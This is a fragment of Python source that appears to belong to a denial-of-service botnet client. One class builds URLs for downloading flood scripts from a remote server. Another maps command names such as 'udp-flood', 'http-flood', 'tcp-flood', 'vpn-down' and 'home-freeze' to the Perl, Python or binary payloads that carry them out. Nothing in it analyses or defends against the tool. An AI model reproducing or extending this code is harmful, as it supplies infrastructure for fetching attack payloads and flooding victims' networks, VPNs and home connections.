...
class Installation(object):
    ...
    def methods(self): return [f"{self.schema}{self.host}:{self.port}/scripts/mix.py",f"{self.schema}{self.host}:{self.port}/scripts/udp-bypass.pl",f"{self.schema}{self.host}:{self.port}/scripts/vpn-down.pl",f"{self.schema}{self.host}:{self.port}/scripts/udp-flood.pl",f"{self.schema}{self.host}:{self.port}/scripts/home-freeze",f"{self.schema}{self.host}:{self.port}/scripts/http"]   
...
class Listener(object):
    ...
    def __init__(self, socket: socket.socket, methods_path) -> None:
        self.sock = socket 
        self.methods = ["udp-flood", "mix", "http-flood", "http-spam", "tcp-flood", "udp-rand", "udp-bypass", "home-freeze", "tcp-http", "vpn-down"]
        self.st = {"udp-flood": ["perl", "udp-flood.pl"], "mix": ["python3", "mix.py"], "http-flood": ["./", "http"], "http-spam": ["./", "httpsp"], "tcp-flood": ["python3", "mix.py"], "udp-rand": "perl", "udp-bypass": ["perl", "udp-bypass.pl"], "home-freeze": ["./", "tch"], "tcp-http": ["python3", "mix.py"], "vpn-down": ["perl", "vpn-down.pl"]}
